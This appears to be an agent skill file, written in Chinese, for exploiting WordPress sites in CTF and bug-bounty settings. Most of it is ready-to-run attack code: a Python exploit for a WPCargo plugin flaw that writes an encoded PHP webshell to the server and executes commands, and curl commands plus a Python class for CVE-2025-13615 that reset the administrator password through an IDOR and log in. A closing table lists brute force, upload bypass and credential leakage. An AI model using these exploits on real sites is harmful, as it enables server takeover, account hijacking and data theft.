---
name: wordpress-vulns
description: Use when encountering WordPress 漏洞 - WPCargo RCE、插件 IDOR、账户接管、CVE 利用
---

# WordPress 漏洞利用

## Info

- **Tags**: wordpress, rce, idor, cve
- **场景**: CTF、SRC WordPress 站点渗透

---

## 1. 信息搜集

```bash
# 检查 WordPress 版本
curl -s http://target.com/readme.html | grep version

# 检查已安装插件
curl -s http://target.com/wp-content/plugins/plugin-name/readme.txt

# WPScan 扫描
wpscan --url http://target.com --enumerate ap,at,tt
```

---

## 2. WPCargo < 6.9.0 未授权 RCE

### 漏洞原理

`/wp-content/plugins/wpcargo/includes/barcode.php` 存在文件写入漏洞，通过 barcode 生成可将特定像素模式写入 PNG 文件，构造特殊 payload 可写入 PHP Webshell。

### 利用脚本

```python
import sys
import binascii
import requests

# 编码 PHP Webshell: <?=$_GET[1]($_POST[2]);?>
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://target.com/'

# 上传 Webshell 到指定路径
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# 执行命令
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": "id"}
).content.decode('ascii', 'ignore'))
```

---

## 3. CVE-2025-13615 StreamTube Core 插件 IDOR

### 漏洞描述

StreamTube Core 插件的密码修改功能存在 IDOR 漏洞，`user_id` 参数未做授权检查，攻击者可修改任意用户密码。

### 利用步骤

```bash
# Step 1: 侦察 - 检查插件是否安装
curl -s http://target.com/wp-content/plugins/streamtube-core/readme.txt

# Step 2: 修改管理员密码（user_id=1 通常是 admin）
curl -X POST http://target.com/ \
  -d "streamtube_action=change_password" \
  -d "user_id=1" \
  -d "new_password=AttackerPassword123!"

# Step 3: 登录验证
curl -c cookies.txt \
  -d "log=admin" \
  -d "pwd=AttackerPassword123!" \
  http://target.com/wp-login.php

# Step 4: 访问管理后台
curl -b cookies.txt http://target.com/wp-admin/
```

### Python 自动化

```python
import requests

class CVE_2025_13615_Exploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()

    def exploit(self, user_id, new_password):
        payload = {
            'streamtube_action': 'change_password',
            'user_id': str(user_id),
            'new_password': new_password
        }
        response = self.session.post(self.target + '/', data=payload, timeout=10)
        return response.status_code == 200

    def verify(self, username, password):
        response = self.session.post(
            self.target + '/wp-login.php',
            data={'log': username, 'pwd': password},
            allow_redirects=False
        )
        return 'wordpress_logged_in' in response.cookies

# 使用
exploit = CVE_2025_13615_Exploit("http://target.com")
if exploit.exploit(user_id=1, new_password="Hacked123!"):
    exploit.verify("admin", "Hacked123!")
```

---

## 4. 常见 WordPress 攻击面

| 攻击面 | 利用方式 |
|--------|---------|
| 弱密码 | admin/admin 默认密码 |
| 插件漏洞 | 扫描已知 CVE，利用 RCE/IDOR |
| 主题漏洞 | 恶意主题文件上传 |
| XML-RPC | `system.multicall` 暴力破解 |
| 媒体上传 | PHP 文件上传绕过 |
| 数据库注入 | wp-config.php 泄露数据库凭据 |

---

## CTF 检查清单

- [ ] `readme.html` 检查 WordPress 版本
- [ ] `wp-content/plugins/` 枚举插件
- [ ] WPScan 扫描已知漏洞
- [ ] WPCargo barcode.php RCE
- [ ] 插件 IDOR 密码修改漏洞
- [ ] XML-RPC 暴力破解
- [ ] wp-config.php 泄露检查
